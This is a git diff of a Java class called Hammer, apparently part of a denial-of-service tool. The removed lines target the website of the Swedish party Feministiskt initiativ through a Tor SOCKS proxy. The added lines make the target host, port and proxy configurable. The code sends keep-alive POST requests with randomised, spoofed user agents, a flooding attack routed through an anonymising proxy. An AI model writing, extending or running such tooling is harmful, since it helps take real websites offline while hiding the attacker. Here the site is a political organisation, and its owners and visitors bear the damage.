@@ -8,6 +8,20 @@ import java.net.SocketAddress;
 import java.util.Random;
 
 public class Hammer implements Runnable {
+	
+	private String address;
+	private int port;
+	
+	private String phost;
+	private int pport;
+	
+	public Hammer(String address, int port, String phost, int pport) {
+		this.address = address;
+		this.port = port;
+		
+		this.phost = phost;
+		this.pport = pport;
+	}
 
 	public static final String[] USERAGENTS = new String[] { "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)", "Googlebot/2.1 (http://www.googlebot.com/bot.html)", 
@@ -30,10 +44,10 @@ public class Hammer implements Runnable {
 	@Override
 	public void run() {
 		try {
-			SocketAddress addr = new InetSocketAddress("127.0.0.1", 9050);
+			SocketAddress addr = new InetSocketAddress(phost, pport);
 			Proxy proxy = new Proxy(Proxy.Type.SOCKS, addr);
 			Socket socket = new Socket(proxy);
-			InetSocketAddress dest = new InetSocketAddress("feministisktinitiativ.se", 80);
+			InetSocketAddress dest = new InetSocketAddress(address, port);
 			socket.connect(dest);
 			
 			OutputStream os = socket.getOutputStream();
@@ -41,7 +55,7 @@ public class Hammer implements Runnable {
 			String useragent = getRandomUserAgent();
 			
 			os.write(("POST / HTTP/1.1\r\n" +
-                    "Host: www.feministisktinitiativ.se\r\n" +
+                    "Host: " + address + "\r\n" +
                     "User-Agent: " + useragent + "\r\n" +
                     "Connection: keep-alive\r\n" +
                     "Keep-Alive: 900\r\n" +
